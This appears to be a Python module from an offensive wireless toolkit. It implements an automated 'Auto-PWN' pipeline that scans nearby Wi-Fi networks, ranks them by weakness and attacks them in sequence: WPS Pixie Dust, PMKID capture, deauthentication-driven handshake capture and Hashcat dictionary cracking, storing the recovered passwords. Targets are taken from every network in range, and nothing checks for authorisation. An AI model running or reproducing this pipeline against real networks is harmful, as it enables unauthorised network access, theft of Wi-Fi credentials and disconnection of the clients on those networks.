"""Auto-PWN Automated Wireless Auditing Pipeline for Wafford."""

from __future__ import annotations

import logging
import time
from dataclasses import dataclass, field
from typing import Any

from wafford.core.base import AttackResult, BaseAttack
from wafford.core.handshake import HandshakeCapture
from wafford.core.pmkid import PMKIDAttack
from wafford.core.scanner import NetworkScanner, ScanResult
from wafford.core.wpa_crack import WPACracker
from wafford.core.wps import WPSAttack

logger = logging.getLogger("wafford.core.autopwn")


@dataclass
class AutoPWNTarget:
    """A prioritized target network in the AutoPWN queue."""

    bssid: str
    essid: str
    channel: int
    encryption: str
    signal: int
    wps_enabled: bool = False
    clients: list[str] = field(default_factory=list)
    handshake_path: str = ""
    pmkid_path: str = ""
    pin: str = ""
    password: str = ""
    status: str = "queued"  # queued, attacking, captured, cracked, failed


class AutoPWNEngine(BaseAttack):
    """Orchestrates an end-to-end autonomous wireless security audit.

    Pipeline:
    1. Reconnaissance: Fast channel-hopping scan to identify and score targets.
    2. Prioritization: Rank targets by vulnerability
       (WEP -> WPS -> WPA2 with active clients -> Clientless PMKID).
    3. Attack Execution:
       - If WPS: Pixie Dust attack.
       - If WPA2 with clients: Targeted Deauth & 4-way Handshake capture.
       - If WPA2 clientless: hcxdumptool PMKID capture.
    4. Cracking: Feed captured handshakes / PMKIDs into Hashcat with top wordlist.
    5. Persistence & Reporting: Record credentials to SQLite and generate audit report.
    """

    def __init__(
        self,
        interface: str,
        wordlist_path: str = "/usr/share/wordlists/rockyou.txt",
        max_targets: int = 5,
        scan_duration: int = 30,
        dwell_per_target: int = 45,
    ) -> None:
        super().__init__(interface)
        self.wordlist_path = wordlist_path
        self.max_targets = max_targets
        self.scan_duration = scan_duration
        self.dwell_per_target = dwell_per_target
        self.targets: list[AutoPWNTarget] = []
        self.recovered_credentials: list[dict[str, str]] = []
        self._current_step = "idle"

    async def _execute(self, **_kwargs: Any) -> AttackResult:
        start_time = time.time()
        self._info("Auto-PWN Pipeline started on %s", self.interface)

        # ── Step 1: Reconnaissance ────────────────────────────────────────────
        self._current_step = "Reconnaissance"
        self._emit("autopwn.phase", {"phase": "Reconnaissance", "progress": 0.1})
        scanner = NetworkScanner(self.interface)
        networks: list[ScanResult] = []
        async for net in scanner.scan(duration=self.scan_duration):
            networks.append(net)

        if not networks:
            return AttackResult(
                success=False,
                message="No wireless networks discovered during initial scan.",
                time_taken=time.time() - start_time,
            )

        # ── Step 2: Target Prioritization ─────────────────────────────────────
        self._current_step = "Prioritization"
        self._emit("autopwn.phase", {"phase": "Prioritization", "progress": 0.25})
        self._prioritize_targets(networks)
        self._info("Queued %d high-priority targets for automated audit", len(self.targets))

        # ── Step 3: Attack Execution Loop ─────────────────────────────────────
        for idx, target in enumerate(self.targets):
            if not self._running:
                break

            self._current_step = f"Auditing {target.essid} ({target.bssid})"
            target.status = "attacking"
            self._emit("autopwn.target_update", {"target": target, "index": idx})

            # Attempt 1: WPS Pixie Dust if WPS is available
            if target.wps_enabled:
                try:
                    wps = WPSAttack(self.interface, target.bssid, target.channel, target.essid)
                    wps_res = await wps.attack_pixie_dust(timeout_sec=self.dwell_per_target)
                    if wps_res.success and wps_res.password:
                        target.password = wps_res.password
                        target.pin = wps_res.extra.get("pin", "")
                        target.status = "cracked"
                        self.recovered_credentials.append({
                            "bssid": target.bssid,
                            "essid": target.essid,
                            "password": target.password,
                            "pin": target.pin,
                            "type": "WPS_PIXIE",
                        })
                        self._emit("autopwn.credential", self.recovered_credentials[-1])
                        continue
                except Exception as e:
                    logger.debug("WPS attack error on %s: %s", target.bssid, e)

            # Attempt 2: PMKID Attack
            try:
                pmkid = PMKIDAttack(self.interface)
                pmkid_res = await pmkid.capture(
                    target.bssid, target.channel, timeout=20
                )
                if pmkid_res.success and pmkid_res.capture_file:
                    target.pmkid_path = pmkid_res.capture_file
                    target.status = "captured"
            except Exception as e:
                logger.debug("PMKID attack error on %s: %s", target.bssid, e)

            # Attempt 3: Handshake Capture if clients are present
            if target.clients and not target.pmkid_path:
                try:
                    hs = HandshakeCapture(self.interface)
                    hs_res = await hs.capture(
                        target.bssid,
                        target.channel,
                        duration=self.dwell_per_target,
                        deauth_interval=5,
                    )
                    if hs_res.success and hs_res.capture_file:
                        target.handshake_path = hs_res.capture_file
                        target.status = "captured"
                except Exception as e:
                    logger.debug("Handshake capture error on %s: %s", target.bssid, e)

            # ── Step 4: Cracking ──────────────────────────────────────────────
            capture_file = target.handshake_path or target.pmkid_path
            if capture_file and not target.password:
                try:
                    self._current_step = f"Cracking {target.essid}"
                    cracker = WPACracker(
                        capture_file,
                        hash_mode="pmkid" if target.pmkid_path else "wpa",
                    )
                    crack_res = await cracker.dictionary_attack(wordlist=self.wordlist_path)
                    if crack_res.success and crack_res.password:
                        target.password = crack_res.password
                        target.status = "cracked"
                        self.recovered_credentials.append({
                            "bssid": target.bssid,
                            "essid": target.essid,
                            "password": target.password,
                            "type": "WPA2_HASHCAT",
                        })
                        self._emit("autopwn.credential", self.recovered_credentials[-1])
                    else:
                        target.status = "failed"
                except Exception as e:
                    logger.debug("Cracking error on %s: %s", target.bssid, e)
                    target.status = "failed"
            elif not target.password:
                target.status = "failed"

            self._emit("autopwn.target_update", {"target": target, "index": idx})

        total_time = time.time() - start_time
        cracked_count = len(self.recovered_credentials)
        msg = (
            f"Auto-PWN completed in {total_time:.1f}s. "
            f"Recovered {cracked_count} network credentials."
        )

        return AttackResult(
            success=cracked_count > 0,
            message=msg,
            time_taken=total_time,
            extra={
                "credentials": self.recovered_credentials,
                "targets": [t.__dict__ for t in self.targets],
            },
        )

    def _prioritize_targets(self, networks: list[ScanResult]) -> None:
        """Score and sort networks to attack the highest probability targets first."""
        scored: list[tuple[int, ScanResult]] = []

        for net in networks:
            score = 0
            if net.wps:
                score += 100
            if net.clients:
                score += len(net.clients) * 15
            # Signal score
            if net.signal_dbm > -60:
                score += 30
            elif net.signal_dbm > -75:
                score += 15

            scored.append((score, net))

        scored.sort(key=lambda x: x[0], reverse=True)
        top_networks = scored[: self.max_targets]

        self.targets = [
            AutoPWNTarget(
                bssid=net.bssid,
                essid=net.essid or "<Hidden>",
                channel=net.channel,
                encryption=net.encryption,
                signal=net.signal_dbm,
                wps_enabled=net.wps,
                clients=[c.get("mac", "") for c in net.clients if c.get("mac")],
            )
            for _, net in top_networks
        ]
